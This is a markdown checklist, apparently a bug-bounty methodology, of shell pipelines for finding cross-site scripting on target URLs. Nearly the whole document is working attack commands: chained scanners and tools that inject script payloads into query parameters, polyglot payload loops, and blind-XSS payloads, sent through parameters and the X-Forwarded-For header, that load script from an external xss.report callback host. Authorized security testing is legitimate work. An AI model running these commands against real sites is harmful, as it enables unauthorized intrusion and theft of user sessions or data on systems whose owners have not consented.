
# **Scanners**

- [ ] **Gather Reflected Characters**
```bash
cat urls.txt | gf xss | uro | Gxss | kxss | grep -v '\[\]' | anew kxss.txt
```

- [ ] **XSStrike**
```bash
python xsstrike.py -u https://target.url/
```

- [ ] **Dalfox**
```bash
cat kxss.txt | cut -d ' ' -f 1 | dalfox pipe
```

# **Reflected XSS in Parameter**

- [ ] **Nuclei Reflected Parameter Scan**
```bash
cat urls.txt | grep '\?' | uro | nuclei -t ~/nuclei-templates/j4xx3n/xss/rxss-param.yaml
```


- [ ] **Reflected XSS**
```bash
cat urls.txt | gf xss | urldedupe | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln


cat xss.txt | qsreplace -a '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln


cat ~/Tools/loxs/payloads/xsspollygots.txt | while read e; do cat xss.txt | qsreplace $e | xsschecker -match -vuln $e ; done | grep -v 'Not Vulnerable'
```


# **Reflected XSS in Path Segment**

- [ ] **Reflected XSS**
```bash
cd PathSegmentXss

./main.py urls.txt | nuclei -t rxss-path.yaml 
```

# **Blind XSS in Parameter**

- [ ] **Blind XSS**
```bash
cat urls.txt | bxss -payload '"><script src=https://xss.report/c/j4xx3n></script>' -header "X-Forwarded-For"

cat urls.txt | grep "&" | bxss -appendMode -payload '"><script src=https://xss.report/c/j4xx3n></script>' -parameters
```


# **Blind XSS in Path Segment**

- [ ] **Blind XSS**
```bash
cd PathSegmentXss/Blind

./main.py ../urls.txt | httpx-toolkit 
```
- Check `xss.report` for results.

# **Results**

```


```

